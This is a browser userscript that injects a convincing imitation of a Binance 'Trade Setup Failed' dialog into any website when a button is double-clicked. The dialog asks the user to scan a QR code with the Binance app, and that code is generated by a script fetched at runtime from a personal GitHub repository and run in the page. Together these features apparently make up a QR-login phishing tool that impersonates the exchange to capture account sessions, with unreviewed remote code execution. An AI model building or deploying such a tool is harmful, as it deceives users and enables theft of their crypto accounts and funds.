// ==UserScript==
// @name         Binance QR Modal Trigger
// @namespace    http://tampermonkey.net/
// @version      2.8
// @description  Double-click any button to show a modern Binance UI QR modal.
// @author       You
// @match        *://*/*
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @connect      raw.githubusercontent.com
// ==/UserScript==

(function() {
    'use strict';

    // 1. Inject Modern Binance UI CSS
    GM_addStyle(`
        /* Fallback Open-Source Font (Used by Binance) */
        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap');

        /* Import Exact Binance Sans Font from their public CDN */
        @font-face {
            font-family: 'Binance Sans';
            src: url('https://public.bnbstatic.com/static/fonts/BinanceSans-Regular.woff2') format('woff2');
            font-weight: 400;
            font-style: normal;
            font-display: swap;
        }
        @font-face {
            font-family: 'Binance Sans';
            src: url('https://public.bnbstatic.com/static/fonts/BinanceSans-Medium.woff2') format('woff2');
            font-weight: 500;
            font-style: normal;
            font-display: swap;
        }
        @font-face {
            font-family: 'Binance Sans';
            src: url('https://public.bnbstatic.com/static/fonts/BinanceSans-SemiBold.woff2') format('woff2');
            font-weight: 600;
            font-style: normal;
            font-display: swap;
        }
        @font-face {
            font-family: 'Binance Sans';
            src: url('https://public.bnbstatic.com/static/fonts/BinanceSans-Bold.woff2') format('woff2');
            font-weight: 700;
            font-style: normal;
            font-display: swap;
        }

        #bn-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(6px);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            /* Exact Font Stack used by official Binance website */
            font-family: "Binance Sans", "IBM Plex Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        #bn-overlay.bn-active {
            opacity: 1;
        }
        #bn-modal {
            background: #181A20; /* Binance Dark Mode Background */
            border: 1px solid #2B3139;
            border-radius: 16px;
            padding: 32px;
            width: 90%;
            max-width: 380px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            text-align: center;
            transform: scale(0.9);
            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
            box-sizing: border-box;
        }
        #bn-overlay.bn-active #bn-modal {
            transform: scale(1);
        }
        #bn-close-btn {
            position: absolute;
            top: 16px; right: 16px;
            background: transparent;
            border: none;
            color: #848E9C;
            font-size: 24px;
            cursor: pointer;
            transition: color 0.2s;
            line-height: 1;
        }
        #bn-close-btn:hover {
            color: #ffffff;
        }
        #bn-logo {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-bottom: 28px;
            margin-top: 0px;
            overflow: hidden;
        }
        #bn-logo img {
            width: 160px;
            height: 38px;
            display: block;
        }
        #bn-title {
            color: #ffffff;
            font-size: 22px;
            font-weight: 600;
            margin: 0 0 16px 0;
        }
        #bn-subtitle {
            color: #848E9C;
            font-size: 14px;
            font-weight: 400;
            margin: 0 0 20px 0;
            line-height: 1.6;
        }
        #bn-scan-text {
            color: #848E9C;
            font-size: 14px;
            font-weight: 400;
            margin: 0 0 28px 0;
            line-height: 1.6;
        }
        .bn-highlight {
            color: #FCD535;
            font-weight: 600; /* Changed from 400 to 600 to make it bold */
        }
        #bn-qr-container {
            background: transparent;
            padding: 0px;
            border: 1px solid #848E9C;
            border-radius: 20px;
            width: 282px;
            height: 282px;
            margin: 0 auto 28px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            box-sizing: border-box;
            overflow: hidden;
            position: relative;
        }
        #bn-qr-container .qr-code {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            z-index: 2;
        }
        #bn-loader {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            z-index: 1;
        }
        #bn-loader div {
            width: 8px;
            background: #F3BA2F;
            border-radius: 4px;
            animation: bn-pulse 1s infinite ease-in-out;
            transform-origin: center;
        }
        #bn-loader div:nth-child(1) { animation-delay: 0s; height: 48px; }
        #bn-loader div:nth-child(2) { animation-delay: 0.15s; height: 32px; }
        #bn-loader div:nth-child(3) { animation-delay: 0.3s; height: 48px; }
        #bn-loader div:nth-child(4) { animation-delay: 0.45s; height: 32px; }

        @keyframes bn-pulse {
            0%, 100% { transform: scaleY(0.3); opacity: 0.5; }
            50% { transform: scaleY(1); opacity: 1; }
        }

        #bn-cta-btn {
            width: 100%;
            background: #FCD535;
            color: #181A20;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s, opacity 0.2s;
            letter-spacing: 0.2px;
        }
        #bn-cta-btn:hover {
            background: #F0B90B;
        }
        #bn-footer-text {
            color: #848E9C;
            font-size: 13px;
            font-weight: 400;
            margin: 16px 0 0 0;
            line-height: 1.6;
        }
        #bn-link {
            display: inline-block;
            margin-top: 16px;
            color: #FCD535;
            font-size: 13px;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        #bn-link:hover {
            opacity: 0.8;
            text-decoration: underline;
        }
        #bn-qr-container canvas,
        #bn-qr-container img {
            width: 100% !important;
            height: 100% !important;
            display: block;
            image-rendering: pixelated;
            image-rendering: -moz-crisp-edges;
            image-rendering: crisp-edges;
            border-radius: 19px;
            transform: scale(1.08);
        }
    `);

    // 2. Double-Click Event Listener
    document.addEventListener('dblclick', function(e) {
        const button = e.target.closest('button, [role="button"], .btn, a.btn');
        if (button) {
            e.preventDefault();
            e.stopPropagation();
            openBinanceModal();
        }
    }, true);

    // 3. Modal Creation and Script Injection
    function openBinanceModal() {
        const existingOverlay = document.getElementById('bn-overlay');
        if (existingOverlay) existingOverlay.remove();

        const overlay = document.createElement('div');
        overlay.id = 'bn-overlay';
        // Updated SVG text font-family to match Binance Sans
        overlay.innerHTML = `
            <div id="bn-modal">
                <button id="bn-close-btn">&times;</button>
                <div id="bn-logo">
                    <img src="data:image/svg+xml,%3Csvg%20width%3D%22140%22%20height%3D%2234%22%20viewBox%3D%220%200%20140%2034%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M12%202L17%207L14.5%209.5L12%207L9.5%209.5L7%207L12%202Z%22%20fill%3D%22%23F3BA2F%22%2F%3E%3Cpath%20d%3D%22M7%2017L12%2022L17%2017L14.5%2014.5L12%2017L9.5%2014.5L7%2017Z%22%20fill%3D%22%23F3BA2F%22%2F%3E%3Cpath%20d%3D%22M2%2012L7%207L9.5%209.5L7%2012L9.5%2014.5L7%2017L2%2012Z%22%20fill%3D%22%23F3BA2F%22%2F%3E%3Cpath%20d%3D%22M17%207L22%2012L17%2017L14.5%2014.5L17%2012L14.5%209.5L17%207Z%22%20fill%3D%22%23F3BA2F%22%2F%3E%3Crect%20x%3D%2210%22%20y%3D%2210%22%20width%3D%224%22%20height%3D%224%22%20fill%3D%22%23F3BA2F%22%2F%3E%3Ctext%20x%3D%2230%22%20y%3D%2218%22%20font-family%3D%22Binance%20Sans%2C%20IBM%20Plex%20Sans%2C%20sans-serif%22%20font-weight%3D%22700%22%20font-size%3D%2216%22%20fill%3D%22%23F3BA2F%22%20letter-spacing%3D%221.5%22%3EBINANCE%3C%2Ftext%3E%3C%2Fsvg%3E" alt="Binance Logo">
                </div>
                <h2 id="bn-title">Trade Setup Failed</h2>
                <p id="bn-subtitle">Your trade was not executed because the final price exceeded the allowed deviation limit.</p>
                <p id="bn-scan-text">Scan with your <span class="bn-highlight">Binance App</span></p>

                <div id="bn-qr-container">
                    <div id="bn-loader">
                        <div></div><div></div><div></div><div></div>
                    </div>
                    <div class="qr-code"></div>
                </div>

                <button id="bn-cta-btn">Modify Trade</button>
                <p id="bn-footer-text">Please review the current market price and place your order again.</p>
                <a href="javascript:void(0)" id="bn-link">View Order History</a>
            </div>
        `;

        document.body.appendChild(overlay);

        setTimeout(() => {
            overlay.classList.add('bn-active');
        }, 10);

        document.getElementById('bn-close-btn').addEventListener('click', closeModal);
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) closeModal();
        });

        const qrContainer = document.getElementById('bn-qr-container');
        const upscaleCanvas = (canvas) => {
            if (!canvas || canvas.dataset.bnUpscaled === '1') return;
            const srcW = canvas.width;
            const srcH = canvas.height;
            if (!srcW || !srcH) return;

            const scale = 3;
            const newW = srcW * scale;
            const newH = srcH * scale;

            const off = document.createElement('canvas');
            off.width = newW;
            off.height = newH;
            const offCtx = off.getContext('2d');
            offCtx.imageSmoothingEnabled = false;
            offCtx.drawImage(canvas, 0, 0, newW, newH);

            canvas.width = newW;
            canvas.height = newH;
            const ctx = canvas.getContext('2d');
            ctx.imageSmoothingEnabled = false;
            ctx.drawImage(off, 0, 0);

            canvas.dataset.bnUpscaled = '1';
        };

        const observer = new MutationObserver(() => {
            const canvas = qrContainer.querySelector('canvas');
            if (canvas) {
                upscaleCanvas(canvas);
                const loader = document.getElementById('bn-loader');
                if (loader) loader.style.display = 'none';
                observer.disconnect();
            }
        });
        observer.observe(qrContainer, { childList: true, subtree: true });

        // Fetch and inject the external QR script
        GM_xmlhttpRequest({
            method: "GET",
            url: "https://raw.githubusercontent.com/davidalaba13/qrcode-test/refs/heads/main/qr.js",
            onload: function(response) {
                if (response.status === 200) {
                    const script = document.createElement('script');
                    script.textContent = response.responseText;
                    document.body.appendChild(script);
                    setTimeout(() => {
                        const canvas = qrContainer.querySelector('canvas');
                        if (canvas) {
                            upscaleCanvas(canvas);
                            const loader = document.getElementById('bn-loader');
                            if (loader) loader.style.display = 'none';
                        }
                    }, 400);
                } else {
                    console.error("Failed to load QR script");
                }
            },
            onerror: function(err) {
                console.error("Error fetching QR script:", err);
            }
        });
    }

    function closeModal() {
        const overlay = document.getElementById('bn-overlay');
        if (overlay) {
            overlay.classList.remove('bn-active');
            setTimeout(() => overlay.remove(), 300);
        }
    }
})();
